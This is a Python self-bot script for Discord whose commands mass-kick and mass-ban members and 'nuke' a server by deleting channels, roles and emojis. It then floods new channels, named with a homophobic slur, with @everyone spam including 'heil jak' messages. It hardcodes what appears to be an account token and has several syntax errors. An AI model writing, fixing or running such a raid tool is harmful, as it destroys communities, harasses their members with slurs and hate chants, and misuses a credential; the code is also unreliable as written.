import discord
from discord.ext import commands
import json
import os
import threading
import requests
import asyncio


client = commands.Bot(command_prefix="%", self_bot=True, help_command=None, intents=discord.Intents.all()

token = "MTAyOTcwNzU0NTcyNTY1MzAxMg.GAS-oe.VmVlHxma1LEXMsZjb263BiiyltYqnmTAFfKbGk" 

###################

@client.command(pass_context=True)
async def help(ctx):
    await ctx.message.delete()
    member = ctx.message.author

    embed = discord.Embed(
        colour = discord.Colour.blue()
    )

    embed.set_author(name='Heil Jak')
    embed.add_field(name='Masskick', value='Kicks every member in a server', inline=False)
    embed.add_field(name='Massban', value='Bans every member in a server', inline=False)
    embed.add_field(name='Nuke', value='Deleted channels, remakes new ones, deletes roles, bans members, and wipes emojis. In that order', inline=False)
    embed.add_field(name='Help', value='Shows This Menu', inline=False)
    embed.add_field(name='Info', value='Gives information of a user', inline=False)
    await member.send(embed=embed)

###################

@client.event
async def on_ready():
    print ("Bot Has Started")
    await client.change_presence(status=discord.Status.dnd, activity=discord.Game("insert wanted status here")

@client.event
async def on_ready():
  print ("The bot has started")

###################

@client.command(pass_context=True)
async def masskick(ctx):
    await ctx.message.delete()
    guild = ctx.message.guild
    for member in list(client.get_all_members()):
        try:
            await guild.kick(member)
            print (f"{member.name} has been kicked")
        except:
            print (f"{member.name} has FAILED to be kicked")
        print ("Action completed: Kick all")

###################

@client.command(pass_context=True)
async def info(ctx, member: discord.Member=None):
    await ctx.message.delete()
    member = ctx.message.author
    channel = ctx.message.channel
    if member is None:
        pass
    else:
        await channel.send("**The user's name is: {}**".format(member.name) + "\n**The user's ID is: {}**".format(member.id) + "\n**The user's current status is: {}**".format(member.status) + "\n**The user's highest role is: {}**".format(member.top_role) + "\n**The user joined at: {}**".format(member.joined_at))
    print("Action completed: User Info")

###################

@client.command()
async def ping(ctx):
    await ctx.send(f'Pong! {round(client.latency * 1000)}ms')

@client.command
async def invite(ctx):
  await ctx.reply('')

@client.command()
async def nuke(ctx):

    await ctx.guild.edit(name='Fingers Slipped') #Decide what to change the server name to

    for c in ctx.guild.channels:
        await c.delete()

    guild = ctx.message.guild

    n=0
    while(n<=85):
        await guild.create_text_channel('fag') # Decide what should be the name of the text channels that you will create
        n = n+1

    for c in ctx.guild.text_channels:
             await c.send('@everyone ')
             await c.send('@everyone jak did this')
             await c.send('@everyone heil jak')
             await c.send('@everyone https://media.discordapp.net/attachments/1036332852079509514/1066024654046769264/MemeFeedBot_1.mp4')
             await c.send('@everyone https://media.discordapp.net/attachments/1036332852079509514/1066024653602164788/straight-3-1-1-1.mp4')

@client.command()
async def spam(ctx):
    for c in ctx.guild.text_channels:
             await c.send('@here https://media.discordapp.net/attachments/1036332852079509514/1066024654046769264/MemeFeedBot_1.mp4')
             await c.send('@everyone https://media.discordapp.net/attachments/1036332852079509514/1066024653602164788/straight-3-1-1-1.mp4')
             await c.send('@everyone https://media.discordapp.net/attachments/1036332852079509514/1066024654046769264/MemeFeedBot_1.mp4')
             await c.send('@everyone Jak did this')
             await c.send('@everyone touched by jak')

###################

@client.command(pass_context=True)
async def massban(ctx):
    await ctx.message.delete()
    guild = ctx.message.guild
    for member in list(client.get_all_members()):
        try:
            await guild.ban(member)
            print ("User " + member.name + " has been banned")
        except:
            pass
    print ("Action completed: Ban all")
  



client.run(token)
